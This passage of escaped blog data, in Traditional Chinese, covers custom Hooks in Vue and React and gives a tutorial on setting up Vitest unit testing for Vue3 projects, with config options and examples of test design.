\u0026ldquo;自定義 Hook\u0026quot;。\n這裡，我們扔用文章開頭那個 useName 的需求為例，希望達到效果：\n1 2 3 const { name, setName } = useName(); // 隨機生成一個狀態屬性 name，它有一個隨機名作為初始值 // 並且提供了一個可隨時更新該值的方法 setName 如果我們要實現上面效果，我們該怎麼寫代碼呢？\n1 2 3 4 5 6 7 8 9 10 11 12 import React from \u0026#39;react\u0026#39;; export const useName = () =\u0026gt; { // 這個 useMemo 很關鍵 const randomName = React.useMemo(() =\u0026gt; genRandomName(), []); const [ name, setName ] = React.useState(randomName) return { name, setName } } 忍不住要再次感嘆一次，和 mixins 相比，它不僅使用起來更棒，就連定義起來也那麼簡單。\n可能有朋友會好奇，為什麼不直接這樣寫：\n1 const [ name, setName ] = React.useState(genRandomName()) 因為這樣寫是不對的，每次使用該 Hook 的函數組件被渲染一次時，genRandom() 方法就會被執行一次，雖然不影響 name 的值，但存在性能消耗，甚至產生其他 bug。\n為此，我寫了一個能複現錯誤的 demo，有興趣的朋友可以驗證：\n可以通過 React.useState(() =\u0026gt; randomName()) 傳參來避免重複執行，這樣就不需要 useMemo 了！\nvue 玩家看這裡 vue3 官網 沒有關於 自定義 Hook 的玩法介紹，但實踐起來也並不困難。\n目標也定位實現一個 useName 方法：\n1 2 3 4 5 6 7 8 9 10 11 12 import { ref } from \u0026#39;vue\u0026#39;; export const useName = () =\u0026gt; { const name = ref(genRandomName()) const setName = (v) =\u0026gt; { name.value = v } return { name, setName } } vue 和 react 自定義 Hook 的差異 相似點：總體思路是一致的都遵照著 定義狀態數據、操作狀態數據、隱藏細節 作為核心思路。 差異點：组合式 API 和 React 函数组件，有著本質差異： Vue3 的組件裡，setup 是作為一個早於 \u0026ldquo;created\u0026rdquo; 的生命週期存在的，無論如何，在一個組件的渲染過程中只會進入一次。 React 函数组件則完全不同，如果沒有被 memorized，它們可能會被不停地觸發，不停地進入並執行方法，因此需要開銷的心智相比於 Vue 其實是更多的。 ","date":"2022-12-30T00:00:00Z","image":"https://live.staticflickr.com/65535/52595598278_3dc955c418_o.png","permalink":"https://wayneblog.ga/2022-12-30/why-use-hooks/","title":"淺談為什麼 Vue 和 React 都選擇了 Hooks？"},{"content":" 參考網站\n參考網站\n參考網站\n參考網站\n網站建置不是件簡單的事，我們都知道網站做好之後，有好多細節需要兼顧，所以許多公司花了大量的時間與金錢，耗用人力對維護中的網站進行不斷的、重複的人工測試，想達到的目的不外乎是希望網站不要出錯，可以給客戶/使用者最好的網站使用體驗。本篇章說明使用 Vue3 開發的專案，導入 Vitest 進行極速單元測試的體驗！\n測試的種類 在不同的測試類型中，所需要保護的面向不太相同，以下是不同測試類型的大致介紹：\n單元測試 (Unit testing) 以程式碼的最小單位進行測試，保護程式邏輯不會在系統維護的過程中遭到破壞，也進一步確保維護中的程式碼品質。\n這種測試類型通常由開發人員自行撰寫，自己寫的 Code 自己寫測試，有經驗的開發人員可以用非常有效率的方式撰寫單元測試，因為測試範圍小，這種類型的測試通常不需要設立測試環境，因此可以得到較高的撰寫效率，也是所有測試類型中最容易撰寫的測試類型。不過，對於一個沒有經驗的開發者來說，撰寫單元測試可能會耗用大量時間，寫測試程式的時間很有可能會遠大於實際撰寫程式碼的時間，有蠻多人會因為這樣而放棄撰寫單元測試。\n整合測試 (Integration testing) 整合多方資源進行測試，確保模組與模組之間的互動行為正確無誤，也讓不同模組在各自開發維護的過程中不會因為功能調整而遭到破壞。\n這種類型的測試通常介於單元測試與端對端測試之間，有時候會由專職的測試人員進行開發，但大部分還是由開發團隊中負責特定模組的人來撰寫。有時候單一模組即便完全通過單元測試，獨立運作也正常，但是當需要與其他模組互動時，也是有可能發生錯誤，這時就是整合測試的主要負責領域。\n以下是未通過整合測試的案例：(兩個元件在整合時發現問題)\n端對端測試 (End-to-end testing) (E2E testing) 所謂的「端對端」(E2E) 是指從使用者的角度出發(一端)，對真實系統(另一端)進行測試。\n這種類型的測試對許多公司來說，就是「人工測試」的主要範圍，因為你可以透過人工對已經完整部屬的網站進行測試，因此可以驗證出系統是否符合客戶的實際需求。這部分也可以透過撰寫 E2E 測試程式來進行自動化，增加測試效率。\n這裡有個未通過 E2E 測試的案例相當有趣，雖然每個整套系統每個模組都通過所有單元測試與整合測試，但最後組裝起來後，從使用者的角度無法接受！\n測試案例中的 3A 模式 1 2 3 4 5 6 7 8 9 10 11 12 13 14 describe(\u0026#39;貓咪\u0026#39;, () =\u0026gt; { it(\u0026#39;摸摸，應該會發出「呼嚕嚕」聲\u0026#39;, () =\u0026gt; { // ... }) it(\u0026#39;餵食，應該會發出「呼嚕嚕」聲\u0026#39;, () =\u0026gt; { // ... }) it(\u0026#39;拿玩具逗，應該會發出「呼嚕嚕」聲\u0026#39;, () =\u0026gt; { // ... }) it(\u0026#39;什麼都不做，應該推倒眼前看到的所有東西\u0026#39;, () =\u0026gt; { // ... }) }) 當我們設立好測試情境與測試案例的敘述結構之後，要開始撰寫測試案例內部的實作時就可以利用所謂的 3A 模式來安排。\n3A 模式主要是為(Arrange-Act-Assert)三個英文字的縮寫，而他們分別代表了：\n準備(Arrange)：準備好受測目標需要的一切，包含依賴的隔離等 操作(Act)：操作受測物目標 斷言(Assert)：預期受測物的某個狀態是否為我們所預期 以上方第一項測試案例來套用 3A 模式的話就會像是：\n1 2 3 4 5 6 7 8 9 10 it(\u0026#39;摸摸，應該會發出「呼嚕嚕」聲\u0026#39;, () =\u0026gt; { // Arrange: 準備好一隻貓 const target = new Cat() // Act: 摸摸那隻貓咪 target.touch() // Assert: 觀察那隻貓是否發出呼嚕嚕叫聲 expect(target.speaking).toBe(\u0026#39;呼嚕嚕\u0026#39;) }) 那如果這時候你可能會想到每個測試案例都要準備一隻貓貓，對於測試案例來說就會一直不斷地去做「準備(Arrange)」這個行為，因此你可能會很直覺的這麼處理：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 describe(\u0026#39;貓咪\u0026#39;, () =\u0026gt; { const target = new Cat() it(\u0026#39;摸摸，應該會發出「呼嚕嚕」聲\u0026#39;, () =\u0026gt; { target.touch() expect(target.speaking).toBe(\u0026#39;呼嚕嚕\u0026#39;) }) it(\u0026#39;餵食，應該會發出「呼嚕嚕」聲\u0026#39;, () =\u0026gt; { target.feed(\u0026#39;乾乾\u0026#39;) expect(target.speaking).toBe(\u0026#39;呼嚕嚕\u0026#39;) }) it(\u0026#39;拿玩具逗，應該會發出「呼嚕嚕」聲\u0026#39;, () =\u0026gt; { target.play() expect(target.speaking).toBe(\u0026#39;呼嚕嚕\u0026#39;) }) }) 但這樣的後果就是每個測試案例之間就會有關聯了，比方貓貓其實摸太多下他也會覺得厭煩，從而導致測試失敗：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 describe(\u0026#39;貓咪\u0026#39;, () =\u0026gt; { const target = new Cat() it(\u0026#39;摸摸下巴，應該會發出「呼嚕嚕」聲\u0026#39;, () =\u0026gt; { target.touch() expect(target.speaking).toBe(\u0026#39;呼嚕嚕\u0026#39;) }) it(\u0026#39;再摸一次下巴，應該會發出「呼嚕嚕」聲\u0026#39;, () =\u0026gt; { target.touch() expect(target.speaking).toBe(\u0026#39;呼嚕嚕\u0026#39;) }) it(\u0026#39;再摸一次下巴，應該會發出「呼嚕嚕」聲\u0026#39;, () =\u0026gt; { target.touch() expect(target.speaking).toBe(\u0026#39;呼嚕嚕\u0026#39;) // 預期呼嚕嚕，結果貓咪生氣了 }) }) 而要寫好測試案例的其中幾個概念就是要盡量讓每個測試案例之間「不受順序影響測試結果」與「保持獨立」。\n因此大多數的「測試環境」的工具都會提供類似相關的 API 來協助處理測試開始前的「Setup」與結束後的「Teardown」環節。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 describe(\u0026#39;貓咪\u0026#39;, () =\u0026gt; { const target = new Cat() beforeEach(() =\u0026gt; { // 每個測試案例開始前要做的事情 target.init() // 初始化貓貓的各種狀態 }) afterEach(() =\u0026gt; { // 每個測試案例結束後要做的事情 }) it(\u0026#39;摸摸，應該會發出「呼嚕嚕」聲\u0026#39;, () =\u0026gt; { target.touch() // 這時候的 target 已經是經過 init() 的版本了 expect(target.speaking).toBe(\u0026#39;呼嚕嚕\u0026#39;) }) it(\u0026#39;餵食，應該會發出「呼嚕嚕」聲\u0026#39;, () =\u0026gt; { target.feed(\u0026#39;乾乾\u0026#39;) // 這時候的 target 已經是經過 init() 的版本了 expect(target.speaking).toBe(\u0026#39;呼嚕嚕\u0026#39;) }) it(\u0026#39;拿玩具逗，應該會發出「呼嚕嚕」聲\u0026#39;, () =\u0026gt; { target.play() // 這時候的 target 已經是經過 init() 的版本了 expect(target.speaking).toBe(\u0026#39;呼嚕嚕\u0026#39;) }) }) 綜合上述 3A 與處理 Setup \u0026amp; Teardown 的觀念，之後再寫測試案例時，我們可以先從基礎的 3A 模式開始撰寫，而到有需要處理重複的事前準備(Setup)與後續清理時(Teardown)，就可以藉由工具來替我們統一處理。\n看到這邊讀者應該會發現，測試的基本概念其實不難懂，而在瞭解測試的概念後，剩下的就是把概念轉換為測試工具可讀懂測試程式碼就好了！\n專案加入 Vitest 在初始化專案過程加入 Vitest 建立專案時若要加入單元測試要注意到的是：Node.js 版本必須為 14 以上，否則 Vitest 會無法順利執行！\n確認 Node.js 版本後，在要建立專案的父層路徑底下透過終端機指令輸入 npm create vite@latest 來建立一個基於 Vite 所建構的專案，接著終端機會出現一些問題，視專案需求選擇：\nProject name ⇒ 輸入自訂的專案名稱後按下 Enter Select a framework ⇒ 選擇 Vue 後按下 Enter Select a variant ⇒ 選擇 Customize with create-vue 後按下 Enter 中間可能還會有 TypeScript, ESLint⋯⋯等等問題，請視專案需要加入 Add Vitest for Unit Testing(y/n) ⇒ 選擇 Yes 後按下 Enter (最重要的部分 回答完上面的問題後，建構工具就會依據剛才答覆的內容，自動生成需要的部分。\n比方在 Add Vitest for Unit Testing 問題回答 Yes 的話，這時建構工具就會在專案中生成單元測試所需要的相關內容如下：\n一個位於 ~專案根目錄/src/components/__test__/HelloWorld.spec.js 的測試範例 1 2 3 4 5 6 7 8 9 10 11 import { describe, it, expect } from \u0026#39;vitest\u0026#39; import { mount } from \u0026#39;@vue/test-utils\u0026#39; import HelloWorld from \u0026#39;../HelloWorld.vue\u0026#39; describe(\u0026#39;HelloWorld\u0026#39;, () =\u0026gt; { it(\u0026#39;renders properly\u0026#39;, () =\u0026gt; { const wrapper = mount(HelloWorld, { props: { msg: \u0026#39;Hello Vitest\u0026#39; } }) expect(wrapper.text()).toContain(\u0026#39;Hello Vitest\u0026#39;) }) }) 在 ~專案根目錄/package.json 自動新增一個啟動單元測試的 scripts 指令 1 2 3 4 5 { \u0026#34;scripts\u0026#34;: { \u0026#34;test:unit\u0026#34;: \u0026#34;vitest --environment jsdom\u0026#34; }, } 在 ~專案根目錄/package.json 自動新增單元測試所需要的工具們 1 2 3 4 5 6 7 { \u0026#34;devDependencies\u0026#34;: { \u0026#34;@vue/test-utils\u0026#34;: \u0026#34;^2.0.2\u0026#34;, \u0026#34;jsdom\u0026#34;: \u0026#34;^20.0.0\u0026#34;, \u0026#34;vitest\u0026#34;: \u0026#34;^0.23.0\u0026#34; } } 接著如剛剛終端機後方的提示：\n執行 cd {剛才專案名稱} 切換到專案目錄底下 執行 npm install 安裝專案所需要的內容 安裝完畢後，接著就可以執行 npm run dev 確認環境，後續要執行測試的話，執行 npm run test:unit 就能立即運作了。\n在既有專案中加入 Vitest 在既有專案中加入 Vitest 來作為執行測試的環境時，需確認專案本身是由 Vite(2.7.10 版本以上)所建構的之外，其 Node.js 版本也必須為 14 以上，否則會無法順利執行測試！\n確認好必要條件後就可以開始安裝測試工具：\nvitest：單元測試框架(提供了執行測試的環境、斷言、隔離庫⋯⋯等等功能與 API) @vue/test-utils：測試 Vue 元件的工具 jsdom：讓我們可以在 Node 環境模擬出瀏覽器中的 DOM 環境(方便測試) 在專案根目錄下執行： 1 npm install -D vitest @vue/test-utils jsdom 新增 npm 執行單元測試的指令： package.json 1 2 3 4 5 { \u0026#34;scripts\u0026#34;: { \u0026#34;test:unit\u0026#34;: \u0026#34;vitest --environment jsdom\u0026#34; }, } 這時若心急的執行 npm run test:unit 會發現終端機告訴你 No test files found, exiting with code 1，原因是你尚未加入任何一個測試案例。\n而一開始 Vitest 預設測試的比對規則是 */*.{test,spec}.{js,mjs,cjs,ts,mts,cts,jsx,tsx}，簡單來說你在專案底下使用 A.test.js 或是 B.spec.ts 的方式都會被 Vitest 認為是測試程式檔。\n這時，我們可以在 ~專案根目錄/src/components/__test__/ 底下新建 HelloWorld.spec.js：\nsrc/components/test/HelloWorld.spec.js 1 2 3 4 5 6 7 import { describe, it, expect } from \u0026#39;vitest\u0026#39; describe(\u0026#39;HelloWorld\u0026#39;, () =\u0026gt; { it(\u0026#39;1 + 1 should be 2\u0026#39;, () =\u0026gt; { expect(1 + 1).toBe(2) }) }) 再次執行 npm run test:unit 終端機就會顯示：\n到這裡就算是成功安裝好囉，接下來我們會再把 Vitest Config 初期需要設定的部分調整好後，建置的部分就完成了。\nVitest Config 設定方式 Vitest 測試在執行的時候預設會基於原先專案中的 vite.config.js 設定檔，所以沒有需要調整的話不太需要另外設置，需要調整的話 Vitest 也提供了三種方法讓你在不同開發情境下選擇調整方式：\n執行 npm 指令時帶參數指定設定檔案路徑 直接在原先 vite.config.js 中調整 透過 vitest.config.js 檔案調整測試設定 執行 npm 指令時帶參數指定設定檔案路徑 若想要在執行的時候去引入不同的設定檔案，則可以在 package.json 指令中透過 --config 加上設定檔案的路徑(e.g. vitest --config ./src/scripts/vitest.config.js )：\npackage.json 1 2 3 4 5 6 7 { //... \u0026#34;scripts\u0026#34;: { \u0026#34;test:unit\u0026#34;: \u0026#34;vitest --config ./src/__test__/config/vitest.config.js\u0026#34;, } //... } 接著該檔案就如設定 vitest.config.js 一樣調整就可以了：\n1 2 3 4 5 6 7 8 9 10 11 12 import { defineConfig } from \u0026#39;vite\u0026#39; import vue from \u0026#39;@vitejs/plugin-vue\u0026#39; // https://vitejs.dev/config/ export default defineConfig({ plugins: [ vue(), ], test: { // 在這邊加入設定 }, }) 在專案中的 vite.config.js 中調整測試設定 若想在原先的 vite.config.js 中調整測試設定，有兩種方式可以使用：\n第一種是直接在最上方加入 /// \u0026lt;reference types=\u0026quot;vitest\u0026quot; /\u0026gt; 後，在 test 屬性中加入設定： vite.config.js 1 2 3 4 5 6 7 8 /// \u0026lt;reference types=\u0026#34;vitest\u0026#34; /\u0026gt; import { defineConfig } from \u0026#39;vite\u0026#39; export default defineConfig({ test: { // 在這邊加入設定 }, }) 第二種，把原先的 defineConfig 改由 vitest/config 傳入後，在 test 屬性中加入設定： vite.config.js 1 2 3 4 5 6 7 import { defineConfig } from \u0026#39;vitest/config\u0026#39; export default defineConfig({ test: { // 在這邊加入設定 }, }) 透過 vitest.config.js 檔案調整測試設定 若想區隔開發與測試用的設定時，可以在專案根目錄中新增 vitest.config.js 檔案，這會比原先參考的 vite.config.js 擁有更高的優先權。\n不想將原先在 vite.config.js 設定都重新全寫一次的話，也可以在 vitest.config.js 中，使用 mergeConfig 來融合 vite.config.js 的設定：\n1 2 3 4 5 6 7 8 9 import { mergeConfig } from \u0026#39;vite\u0026#39; import { defineConfig } from \u0026#39;vitest/config\u0026#39; import viteConfig from \u0026#39;./vite.config\u0026#39; // 原先的 vite 設定檔案 export default mergeConfig(viteConfig, defineConfig({ test: { // 在這裡加入測試設定 }, })) Vitest config option 至於 Vitest config 能調整什麼內容呢，這裡列了幾個常見的調整選項：\ninclude exclude globals environment 註：以下部分資料引用 Vitest Config Option 並翻譯與補充。\ninclude Type： string[] 預設值： [\u0026rsquo;**/*.{test,spec}.{js,mjs,cjs,ts,mts,cts,jsx,tsx}'] 藉由這個欄位我們可以提供 glob 格式讓 vitest 去比對哪些是測試檔案，也可以放入多個條件在陣列中。\nvitest.config.js 1 2 3 4 5 6 7 import { defineConfig } from \u0026#39;vitest/config\u0026#39; export default defineConfig({ test: { include: [\u0026#39;**/*.spec.js\u0026#39;], }, }) 這個設定主要會影響到後續我們要如何擺放測試程式碼，因此做規劃時可以按需求考量調整。\nexclude Type： string[] 預設值： [\u0026rsquo;/node_modules/\u0026rsquo;, \u0026lsquo;/dist/\u0026rsquo;, \u0026lsquo;/cypress/\u0026rsquo;, \u0026lsquo;/.{idea,git,cache,output,temp}/\u0026rsquo;] 藉由這個欄位我們可以提供 glob 格式讓 vitest 去排除哪些不是測試檔案，也可以放入多個條件在陣列中。\nvitest.config.js 1 2 3 4 5 6 7 import { defineConfig } from \u0026#39;vitest/config\u0026#39; export default defineConfig({ test: { exclude: [\u0026#39;**/node_modules/**\u0026#39;, \u0026#39;**/dist/**\u0026#39;, \u0026#39;**/cypress/**\u0026#39;, \u0026#39;**/.{idea,git,cache,output,temp}/**\u0026#39;], }, }) 與 include 相反，這次則是要排除哪些路徑不需要尋找是否有測試檔案，其中如果有用到 cypress 做 E2E 測試的話，預設規則中就已經有另外排除了，所以沒必要的話不必特別設置，但可以先記得有這個方便的欄位。\nGlobals Type： boolean 預設值： false 由於在撰寫測試時，Vitest 預設是需要自己按需要引入對應的方法等等，如果要類似像 Jest 以全域的方式注入到測試中，就可以透過在執行時加上 --globals 選項，或是在 vitest config 選項中加入 globals: true。\nvitest.config.js 1 2 3 4 5 6 7 import { defineConfig } from \u0026#39;vitest/config\u0026#39; export default defineConfig({ test: { globals: true, }, }) 原先設定前，測試程式碼需要如下方引入：\n1 2 3 4 5 6 7 import { describe, it, expect } from \u0026#39;vitest\u0026#39; describe(\u0026#39;HelloWorld\u0026#39;, () =\u0026gt; { it(\u0026#39;1 + 1 should be 2\u0026#39;, () =\u0026gt; { expect(1 + 1).toBe(\u0026#39;2\u0026#39;) }) }) 加入 Globals: true 後，就不需要顯示引入 vitest 測試相關的 API，讓測試看起來更乾淨：\n1 2 3 4 5 describe(\u0026#39;HelloWorld\u0026#39;, () =\u0026gt; { it(\u0026#39;1 + 1 should be 2\u0026#39;, () =\u0026gt; { expect(1 + 1).toBe(\u0026#39;2\u0026#39;) }) }) environment Type： \u0026rsquo;node\u0026rsquo; | \u0026lsquo;jsdom\u0026rsquo; | \u0026lsquo;happy-dom\u0026rsquo; | \u0026rsquo;edge-runtime\u0026rsquo; | string 預設值： \u0026rsquo;node\u0026rsquo; 由於 Vitest 本身默認環境 Node.js，因此若要在測試中仿造瀏覽器的應用程式，可以透過類似 jsdom 等工具來取代，而已經介紹過的 npm 指令的寫法之外 -environment jsdom ，還可以在測試檔案上以 docblock 或 comment 風格的方式註記。\nDocblock 風格：\n1 2 3 4 5 6 7 8 9 /** * @vitest-environment jsdom **/ it(\u0026#39;use jsdom in this test file\u0026#39;, () =\u0026gt; { const element = document.createElement(\u0026#39;div\u0026#39;) element.innerHTML = \u0026#39;\u0026lt;p\u0026gt;Hello, HTML!\u0026lt;/p\u0026gt;\u0026#39; expect(element.innerHTML).toBe(\u0026#39;\u0026lt;p\u0026gt;Hello, HTML!\u0026lt;/p\u0026gt;\u0026#39;) }) Comment 風格：\n1 2 3 4 5 6 7 // @vitest-environment jsdom it(\u0026#39;use jsdom in this test file\u0026#39;, () =\u0026gt; { const element = document.createElement(\u0026#39;div\u0026#39;) element.innerHTML = \u0026#39;\u0026lt;p\u0026gt;Hello, HTML!\u0026lt;/p\u0026gt;\u0026#39; expect(element.innerHTML).toBe(\u0026#39;\u0026lt;p\u0026gt;Hello, HTML!\u0026lt;/p\u0026gt;\u0026#39;) }) 寫在 vitest config 中：\n1 2 3 4 5 6 7 import { defineConfig } from \u0026#39;vitest/config\u0026#39; export default defineConfig({ test: { environment: \u0026#39;jsdom\u0026#39;, }, }) 如此一來在測試中我們就可以模擬 Web 端環境來操作了。\n以上是 Vitest 幾個比較常見的設定，其餘的設定後續也會按需求陸續提到，若對於其他設定選項有興趣的，也可以直接到官方文件中的 config 分頁 查看。\n測試的本質 測試的本質究竟是什麼？測試簡單的來說主要就是藉由操控受測物(SUT, System Under Test)，觀察由受測物產生的最終狀態是否如我們所預期的樣子：\n若最終狀態符合我們的預期，對於開發者的含義來說，就是受測物符合了我們的期待。\n但這點好處看似沒有做「測試」的必要，畢竟我們平時開發能驗收完成不就是符合了規格書的期待嗎？\n因此為了能夠更加體會測試背後的價值，我們接下來將實際做一個測試工具來來檢驗我們自己所寫的函式。\n情境舉例 首先，情境假設在專案中有一處邏輯判斷需要檢測傳進來資料的是否為數值(Numeric)，而傳進來的資料可能有 1, null, '100', NaN 等。\n我們希望當 1 和 '100' 時，該判斷應該要為 true，而 null 與 NaN 則是要為 false。\n接下來的目標我們要做的就是：\n製作一個簡易的測試工具 寫測試案例 寫受測程式碼的實作 簡易的測試工具 首先規劃一下工具我最後希望用起來像是這個樣子：\nexpect(受測物).toBe(預期狀態)\n回傳 true 表示測試成功 (即為最終狀態與預期狀態相同) 回傳 false 表示測試失敗 (即為最終狀態與預期狀態不同)，然後加上 error 提示預期狀態應該要是什麼，最終狀態目前是什麼。 接著按照上面的設想，先定義了一個宣告函式 expect，參數則是預計輸入受測物(input)與：\n1 2 3 const expect = (input) =\u0026gt; { // ... } 再來工具本身呼叫時需回傳了一個叫做 toBe 的驗證方法，該驗證方法的參數為預期目標(expected)：\n1 2 3 4 5 6 const expect = (input) =\u0026gt; { const toBe = (expected) =\u0026gt; {} return { toBe } } 接著設計該驗證的方法，使其能夠回應測試的結果：\n1 2 3 4 5 6 const expect = (input) =\u0026gt; { const toBe = (expected) =\u0026gt; input === expected return { toBe } } 現在我們透過網頁瀏覽器的 devtool console 控制台，就可以透過該測試工具做簡易的測試案例了：\n1 2 3 4 5 6 7 8 const expect = (input) =\u0026gt; { const toBe = (expected) =\u0026gt; input === expected return { toBe } } expect(1 === 1).toBe(true) expect(2 !== 1).toBe(true) 但我們希望他能夠在測試案例失敗的時候回應一下當下預期與結果的狀況，後續我們才能針對紀錄的結果做修正。因此我們再修改一下測試方法：\n1 2 3 4 5 6 7 8 9 10 const expect = (input) =\u0026gt; { const handleOnError = (result, expected) =\u0026gt; { console.error(`測試失敗：預期應該為 ${expected}，結果現在為 ${result}`) return false } const toBe = (expected) =\u0026gt; input === expected ? true : handleOnError(input, expected) return { toBe } } 再執行一個故意寫錯的測試案例：\n1 expect(2 === 1).toBe(true) 現在可以看到當測試案例發生錯誤的時候，除了會回傳測試結果之外，還會多個錯誤提醒目前錯誤的原因了！\n寫測試案例 在完成測試工具後，現在我們要來寫測試案例，首先我們先寫一個還沒有寫實作部分的判斷函式(isNumeric)：\n1 const isNumeric = (val) =\u0026gt; {} 接著按照題目所設定的條件，來撰寫測試案例：\n題目設定：\n當 1 和 '100' 時，該判斷應該要為 true，\n而 null 與 NaN 則是要為 false。\n1 2 3 4 5 6 const isNumeric = (val) =\u0026gt; {} expect(isNumeric(1)).toBe(true) expect(isNumeric(\u0026#39;100\u0026#39;)).toBe(true) expect(isNumeric(null)).toBe(false) expect(isNumeric(NaN)).toBe(false) 此時執行後會發現會發現四個案例都報錯，因為目前我們還沒撰寫 isNumeric 的判斷實作，但到這一步測試案例就已經算是寫好了，因為我們的目的是要寫對的測試案例，讓實作去符合。\n寫受測程式碼的實作 完成測試案例後，我們將要來寫測試程式碼的實作部分：\n1 const isNumeric = (value) =\u0026gt; !isNaN(value - parseFloat(value)) 最後，將整個測試與實作合併起來就會像這樣子：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 // 測試工具程式碼部分 const expect = (input) =\u0026gt; { const handleOnError = (result, expected) =\u0026gt; { console.error(`測試失敗：預期應該為 ${expected}，結果現在為 ${result}`) return false } const toBe = (expected) =\u0026gt; input === expected ? true : handleOnError(input, expected) return { toBe } } // 實作程式碼部分 const isNumeric = (value) =\u0026gt; !isNaN(value - parseFloat(value)) // 測試案例部分 expect(isNumeric(1)).toBe(true) // true，即為通過測試 expect(isNumeric(\u0026#39;100\u0026#39;)).toBe(true) // true，即為通過測試 expect(isNumeric(null)).toBe(false) // true，即為通過測試 expect(isNumeric(NaN)).toBe(false) // true，即為通過測試 完成！現在已經不會顯示測試失敗的訊息了，也就表示 isNumeric 方法符合我們的預期囉。\n而現在假使我想使實作程式碼的部分更加的完善，只要增加合適的測試案例進去就可以增添受測物本身的信賴與穩定度：\n1 2 3 4 5 6 7 expect(isNumeric(1)).toBe(true) expect(isNumeric(1.123)).toBe(true) expect(isNumeric(0xFFF)).toBe(true) expect(isNumeric(\u0026#39;100\u0026#39;)).toBe(true) expect(isNumeric(undefined)).toBe(false) expect(isNumeric(null)).toBe(false) expect(isNumeric(NaN)).toBe(false) 甚至將來改寫實作(isNumeric)的時候，既有的測試內容就會提醒你是否違反了之前所寫的測試案例。\n測試工具的選擇 上面有提到簡易的測試工具是如何手刻出來的，也稍微談到了手刻測試工具的困難，因此選擇一個適當的測試工具來輔助我們進行測試是有必要性的。\n但測試工具百百種，許多工具在提供的功能上又重疊，那麼我們該如何選擇工具呢？\n若是以「單元測試」來說的話，我們在撰寫測試程式碼時可能至少就會有以下的需求：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 /* 引入相關檔案 */ describe(\u0026#39;測試情境描述\u0026#39;, () =\u0026gt; { it(\u0026#39;測試案例描述\u0026#39;, () =\u0026gt; { const wrapper = mount(component) expect(wrapper.text()).toBe(\u0026#39;Hello, World\u0026#39;) }) it(\u0026#39;另一個測試案例描述\u0026#39;, () =\u0026gt; { const wrapper = mount(component, { props: { content: \u0026#39;Unit-test!\u0026#39; } }) expect(wrapper.text()).toBe(\u0026#39;Unit-test!\u0026#39;) }) }) 測試環境(test runner)：提供上方測試程式碼執行的環境。 測試情境(test suite)：如上方的 describe，用來包裹多個測試案例，以及描述測試情境⋯⋯等功能。 測試案例(test case)：如上方的 it，用來包裹該測試案例的實際情況，若有錯誤時需讓我們能夠輕易找到是哪個案例發生的⋯⋯等等功能。 斷言(Assertion)：如上方的 expect，主要是用來判斷受測物與預期結果是否一致的方法，甚至依據不同判斷方式內部也提供了多種判斷方式，如 .toBe 可用來判斷選取的目標與預期結果是否相等。 除此之外，在必要的情況下甚至會需要：\n測試替身(test double)：用來模仿依賴工具或函式原先的功能狀況 解析或模擬元件容器 模擬瀏覽器中 DOM 的環境 而根據上述需求，就能夠列出一個需求表，來評估各個測試工具是否符合我們測試需要的部分：\n測試工具列表可參考個框架中的測試建議指南，比方 Vue 的測試建議指南\n需求 Vitest Jest Mocha Chai.js Sinon.js Vue-test-utils jsdom 測試環境(test runner) ✔(註1) ✔ ✔ 測試情境(test suite) ✔ ✔ ✔ 測試案例(test case) ✔ ✔ ✔ 斷言(Assertion) ✔ ✔ ✔ 測試替身(test double) ✔ ✔ ✔ 解析或模擬元件容器 ✔ 提供模擬 DOM 環境 ✔ 註1：Vitest 本身基於 Vite 環境，因此專案若非透過 Vite 所構建的話就無法使用。\n現在透過這個表我們可以很清楚的看見，假設專案是基於 Vite 所建立的那麼我可以選擇下列這個組合：\nVitest + Vue-test-utils + jsdom 如果專案是基於 Vue-cli 所建立的，那麼就無法使用了 Vitest 作為測試運行的環境了，此時根據表中我們就可以替換為：\n方案一：Jest + Vue-test-utils + jsdom 方案二：Mocha + Chai.js + Sinon.js + Vue-test-utils + jsdom 而在做工具替換時，需要注意到的是，不同的測試環境(test runner)可能會對於引入(import)檔案時發生解析上的問題，比方若用到 Vue 中的 SFC 類型檔案作為開發，那在 Jest 做為測試環境時我們就需要另外安裝 vue-jest 來做轉換 SFC 上的處理。\n當然，上述的需求表只是一個簡單的範例，而隨著撰寫測試的經驗越多，後續慢慢就會瞭解到專案中會需要哪些測試工具來協助我們進行測試，甚至比較各種測試工具的優缺點從而選出最適合團隊的測試工具！\n現在我們已經了解要如何挑選測試工具了，接下來要開始聊聊撰寫測試案例時應該要如何思考！\n決定測試情境與測試案例 再來談談在選擇這些工具後，我們要如何來思考針對「單元測試」的部分，測試情境與測試案例要怎麼撰寫以及需要注意的地方。\n測試情境(test suite)測試案例(test case) 提供測試環境的工具一般會給予測試情境與測試案例的相關 API，而測試情境與案例最主要的用意是用來幫助我們規劃與整理整個測試邏輯，並且在我們測試案例錯誤的時候同時提供相對應的資訊。\n接下來我們以「貓咪作為元件」為故事主軸來談談單元測試的思路會是怎麼撰寫。\n首先我們假設「貓咪」元件會提供下列功能：\n發出呼嚕嚕叫聲 推倒眼前看到的所有東西 而以使用者角度上來看，我們會對「貓咪」做出這些事情：\n摸摸 餵食 拿玩具逗 接著我們就可以以元件作為情境來定義出各種使用上的測試案例：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 describe(\u0026#39;貓咪\u0026#39;, () =\u0026gt; { it(\u0026#39;摸摸，應該會發出「呼嚕嚕」聲\u0026#39;, () =\u0026gt; { // ... }) it(\u0026#39;餵食，應該會發出「呼嚕嚕」聲\u0026#39;, () =\u0026gt; { // ... }) it(\u0026#39;拿玩具逗，應該會發出「呼嚕嚕」聲\u0026#39;, () =\u0026gt; { // ... }) it(\u0026#39;什麼都不做，應該推倒眼前看到的所有東西\u0026#39;, () =\u0026gt; { // ... }) }) 但真實的測試案例不會這麼簡單，總會有一些例外狀況，那麼測試案例應該要包含哪些要素比較好？\n案例路徑(happy path、sad path、bad path) 在設定測試案例時，總會有百百種情況，但是我們不可能每個都寫出來，而根據測試案例的類型主要可以分為三種路徑：\nHappy Path：在我們定義所謂「正常的使用狀況」下，針對「正確的內容」，我們預期應該要做出的反應。 Sad Path：在我們定義所謂「正常的使用狀況」下，針對「錯誤的內容」，我們預期應該要做出的反應。 Bad Path：在我們定義所謂「錯誤」的使用狀況下，我們預期應該要做出的反應。 